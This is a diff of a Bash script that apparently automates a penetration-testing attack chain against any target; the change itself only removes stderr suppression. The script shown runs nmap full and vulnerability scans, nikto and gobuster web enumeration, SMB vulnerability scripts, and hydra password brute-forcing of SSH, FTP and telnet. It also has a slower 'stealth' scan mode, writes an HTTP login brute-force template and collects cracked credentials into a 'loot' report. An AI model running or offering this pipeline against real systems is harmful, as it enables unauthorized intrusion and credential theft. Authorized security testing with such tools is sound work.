@@ -59,8 +59,8 @@ setup() {
     TOOLS=(nmap hydra curl wget nikto whatweb)
     for t in "${TOOLS[@]}"; do
         check_tool "$t" && ok "$t already installed" && continue
-        pkg install -y "$t" 2>/dev/null && ok "$t installed" || \
-        apt install -y "$t" 2>/dev/null && ok "$t installed (apt)" || warn "Failed: $t"
+        pkg install -y "$t"  && ok "$t installed" || \
+        apt install -y "$t"  && ok "$t installed (apt)" || warn "Failed: $t"
     done
 
     mkdir -p "$WORDLIST_DIR"
@@ -111,48 +111,48 @@ nmap -Pn -sS --version-trace 127.0.0.1 &>/dev/null && NMAP_SCAN="-sS" && ok "SYN
 phase_recon() {
     section 1 "RECON — WHOIS / DNS / PING"
     {
-        echo "=== PING ===" && ping -c 3 "$TARGET" 2>/dev/null
-        echo -e "\n=== HOST ===" && check_tool host && host "$TARGET" 2>/dev/null
-        echo -e "\n=== NSLOOKUP ===" && check_tool nslookup && nslookup "$TARGET" 2>/dev/null
+        echo "=== PING ===" && ping -c 3 "$TARGET" 
+        echo -e "\n=== HOST ===" && check_tool host && host "$TARGET" 
+        echo -e "\n=== NSLOOKUP ===" && check_tool nslookup && nslookup "$TARGET" 
     } | tee "$SESSION/enum/recon.txt"
     save "$SESSION/enum/recon.txt"
 }
 
 phase_nmap() {
     section 2 "NMAP — PORT SCAN"
-    nmap $NMAP_SCAN -T4 --top-ports 1000 "$TARGET" -oN "$SESSION/nmap/nmap_1_quick.txt" 2>/dev/null
+    nmap $NMAP_SCAN -T4 --top-ports 1000 "$TARGET" -oN "$SESSION/nmap/nmap_1_quick.txt" 
     save "$SESSION/nmap/nmap_1_quick.txt"
-    nmap $NMAP_SCAN -T4 -p- "$TARGET" -oN "$SESSION/nmap/nmap_2_fullports.txt" 2>/dev/null
+    nmap $NMAP_SCAN -T4 -p- "$TARGET" -oN "$SESSION/nmap/nmap_2_fullports.txt" 
     save "$SESSION/nmap/nmap_2_fullports.txt"
 
-    OPEN_PORTS=$(grep "^[0-9]" "$SESSION/nmap/nmap_2_fullports.txt" 2>/dev/null | grep "open" | awk -F/ '{print $1}' | tr '\n' ',')
+    OPEN_PORTS=$(grep "^[0-9]" "$SESSION/nmap/nmap_2_fullports.txt"  | grep "open" | awk -F/ '{print $1}' | tr '\n' ',')
     ok "Open ports: $OPEN_PORTS"
 
     if [[ -n "$OPEN_PORTS" ]]; then
-        nmap $NMAP_SCAN -sV -sC -p"${OPEN_PORTS}" "$TARGET" -oN "$SESSION/nmap/nmap_3_services.txt" 2>/dev/null
+        nmap $NMAP_SCAN -sV -sC -p"${OPEN_PORTS}" "$TARGET" -oN "$SESSION/nmap/nmap_3_services.txt" 
         save "$SESSION/nmap/nmap_3_services.txt"
-        nmap --script vuln -p"${OPEN_PORTS}" "$TARGET" -oN "$SESSION/nmap/nmap_4_vulns.txt" 2>/dev/null
+        nmap --script vuln -p"${OPEN_PORTS}" "$TARGET" -oN "$SESSION/nmap/nmap_4_vulns.txt" 
         save "$SESSION/nmap/nmap_4_vulns.txt"
     fi
 
-    grep -q "80/open\|443/open\|8080/open" "$SESSION/nmap/nmap_2_fullports.txt" 2>/dev/null && HAS_WEB=true
-    grep -q "445/open\|139/open" "$SESSION/nmap/nmap_2_fullports.txt" 2>/dev/null && HAS_SMB=true
-    grep -q "22/open" "$SESSION/nmap/nmap_2_fullports.txt" 2>/dev/null && HAS_SSH=true
-    grep -q "21/open" "$SESSION/nmap/nmap_2_fullports.txt" 2>/dev/null && HAS_FTP=true
-    grep -q "23/open" "$SESSION/nmap/nmap_2_fullports.txt" 2>/dev/null && HAS_TELNET=true
+    grep -q "80/open\|443/open\|8080/open" "$SESSION/nmap/nmap_2_fullports.txt"  && HAS_WEB=true
+    grep -q "445/open\|139/open" "$SESSION/nmap/nmap_2_fullports.txt"  && HAS_SMB=true
+    grep -q "22/open" "$SESSION/nmap/nmap_2_fullports.txt"  && HAS_SSH=true
+    grep -q "21/open" "$SESSION/nmap/nmap_2_fullports.txt"  && HAS_FTP=true
+    grep -q "23/open" "$SESSION/nmap/nmap_2_fullports.txt"  && HAS_TELNET=true
 }
 
 phase_web() {
     section 3 "WEB — ENUM"
     [[ "$HAS_WEB" != true ]] && warn "No web — skipping" && return
-    PROTO="http"; grep -q "443/open" "$SESSION/nmap/nmap_2_fullports.txt" 2>/dev/null && PROTO="https"
+    PROTO="http"; grep -q "443/open" "$SESSION/nmap/nmap_2_fullports.txt"  && PROTO="https"
     URL="${PROTO}://${TARGET}"
 
     check_tool whatweb && whatweb "$URL" | tee "$SESSION/whatweb/whatweb_1.txt" && save "$SESSION/whatweb/whatweb_1.txt"
-    check_tool nikto && nikto -h "$URL" -o "$SESSION/nikto/nikto_1.txt" 2>/dev/null && save "$SESSION/nikto/nikto_1.txt"
+    check_tool nikto && nikto -h "$URL" -o "$SESSION/nikto/nikto_1.txt"  && save "$SESSION/nikto/nikto_1.txt"
     check_tool gobuster && [[ -f "$WORDLIST_DIRS" ]] && {
-        gobuster dir -u "$URL" -w "$WORDLIST_DIRS" -o "$SESSION/web/gobuster_1_dirs.txt" 2>/dev/null && save "$SESSION/web/gobuster_1_dirs.txt"
-        gobuster dir -u "$URL" -w "$WORDLIST_DIRS" -x php,txt,html -o "$SESSION/web/gobuster_2_files.txt" 2>/dev/null && save "$SESSION/web/gobuster_2_files.txt"
+        gobuster dir -u "$URL" -w "$WORDLIST_DIRS" -o "$SESSION/web/gobuster_1_dirs.txt"  && save "$SESSION/web/gobuster_1_dirs.txt"
+        gobuster dir -u "$URL" -w "$WORDLIST_DIRS" -x php,txt,html -o "$SESSION/web/gobuster_2_files.txt"  && save "$SESSION/web/gobuster_2_files.txt"
     }
     curl -skI "$URL" | tee "$SESSION/web/headers_1.txt" && save "$SESSION/web/headers_1.txt"
     curl -sk "${URL}/robots.txt" | tee "$SESSION/web/robots_1.txt" && save "$SESSION/web/robots_1.txt"
@@ -163,7 +163,7 @@ phase_smb() {
     section 4 "SMB — PARTIAL (Nmap scripts only)"
     [[ "$HAS_SMB" != true ]] && warn "No SMB — skipping" && return
     warn "Partial SMB support on NetHunter — using Nmap scripts"
-    nmap -p 445,139 --script smb-vuln*,smb-enum* "$TARGET" -oN "$SESSION/smb/nmap_smb_scripts.txt" 2>/dev/null
+    nmap -p 445,139 --script smb-vuln*,smb-enum* "$TARGET" -oN "$SESSION/smb/nmap_smb_scripts.txt" 
     save "$SESSION/smb/nmap_smb_scripts.txt"
 }
 
@@ -171,9 +171,9 @@ phase_brute() {
     section 5 "BRUTE FORCE"
     check_tool hydra || { warn "hydra not found"; return; }
     [[ -f "$WORDLIST_PASS" ]] || { warn "Password wordlist missing"; return; }
-    [[ "$HAS_SSH" == true ]] && hydra -L "$WORDLIST_USER" -P "$WORDLIST_PASS" "$TARGET" ssh -o "$SESSION/hydra/hydra_1_ssh.txt" 2>/dev/null && save "$SESSION/hydra/hydra_1_ssh.txt"
-    [[ "$HAS_FTP" == true ]] && hydra -L "$WORDLIST_USER" -P "$WORDLIST_PASS" "$TARGET" ftp -o "$SESSION/hydra/hydra_2_ftp.txt" 2>/dev/null && save "$SESSION/hydra/hydra_2_ftp.txt"
-    [[ "$HAS_TELNET" == true ]] && hydra -L "$WORDLIST_USER" -P "$WORDLIST_PASS" "$TARGET" telnet -o "$SESSION/hydra/hydra_3_telnet.txt" 2>/dev/null && save "$SESSION/hydra/hydra_3_telnet.txt"
+    [[ "$HAS_SSH" == true ]] && hydra -L "$WORDLIST_USER" -P "$WORDLIST_PASS" "$TARGET" ssh -o "$SESSION/hydra/hydra_1_ssh.txt"  && save "$SESSION/hydra/hydra_1_ssh.txt"
+    [[ "$HAS_FTP" == true ]] && hydra -L "$WORDLIST_USER" -P "$WORDLIST_PASS" "$TARGET" ftp -o "$SESSION/hydra/hydra_2_ftp.txt"  && save "$SESSION/hydra/hydra_2_ftp.txt"
+    [[ "$HAS_TELNET" == true ]] && hydra -L "$WORDLIST_USER" -P "$WORDLIST_PASS" "$TARGET" telnet -o "$SESSION/hydra/hydra_3_telnet.txt"  && save "$SESSION/hydra/hydra_3_telnet.txt"
     printf "# HTTP Brute Template\n# hydra -L users.txt -P rockyou.txt $TARGET http-post-form \"/login:user=^USER^&pass=^PASS^:Invalid\"\n" > "$SESSION/hydra/hydra_4_http_template.txt"
     save "$SESSION/hydra/hydra_4_http_template.txt"
 }
@@ -199,8 +199,8 @@ phase_report() {
     section 7 "FINAL REPORT"
     REPORT_FILE="$SESSION/REPORT_${TARGET}.txt"
     LOOT_FILE="$SESSION/loot/loot_summary.txt"
-    CREDS=$(grep -r "login:" "$SESSION/hydra/" 2>/dev/null | grep -v template | head -10)
-    VULNS=$(grep -i "VULNERABLE\|CVE" "$SESSION/nmap/nmap_4_vulns.txt" 2>/dev/null | head -10)
+    CREDS=$(grep -r "login:" "$SESSION/hydra/"  | grep -v template | head -10)
+    VULNS=$(grep -i "VULNERABLE\|CVE" "$SESSION/nmap/nmap_4_vulns.txt"  | head -10)
     {
         echo "AUTOCORE REPORT | Target: $TARGET | $(date)"
         echo "Open Ports: $OPEN_PORTS"
@@ -223,8 +223,8 @@ case "$MODE" in
     --brute)  phase_recon; phase_nmap; phase_brute ;;
     --stealth)
         phase_recon
-        nmap $NMAP_SCAN -T2 -p- "$TARGET" -oN "$SESSION/nmap/nmap_1_quick.txt" 2>/dev/null
-        OPEN_PORTS=$(grep "open" "$SESSION/nmap/nmap_1_quick.txt" 2>/dev/null | awk -F/ '{print $1}' | tr '\n' ',')
+        nmap $NMAP_SCAN -T2 -p- "$TARGET" -oN "$SESSION/nmap/nmap_1_quick.txt" 
+        OPEN_PORTS=$(grep "open" "$SESSION/nmap/nmap_1_quick.txt"  | awk -F/ '{print $1}' | tr '\n' ',')
         phase_web; phase_smb; phase_brute; phase_msf; phase_report ;;
     *)        phase_recon; phase_nmap; phase_web; phase_smb; phase_brute; phase_msf; phase_report ;;
 esac
